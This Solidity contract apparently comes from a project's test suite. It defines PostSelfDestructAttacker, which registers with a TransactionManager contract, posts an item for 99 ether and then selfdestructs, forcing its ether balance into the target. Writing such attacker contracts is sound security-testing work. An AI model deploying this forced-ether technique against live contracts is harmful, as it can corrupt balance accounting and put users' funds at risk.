// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {TransactionManager} from "../../src/TransactionManager.sol";

contract PostSelfDestructAttacker {
    TransactionManager tmgr;
    constructor(TransactionManager _tmgr) {
        tmgr = _tmgr;
    }

    function attack() public payable {
        tmgr.registerUser();
        tmgr.postItem(0, "ATTACKER", 99 ether, true);
        address payable addr = payable(address(tmgr));
        selfdestruct(addr);

    }
}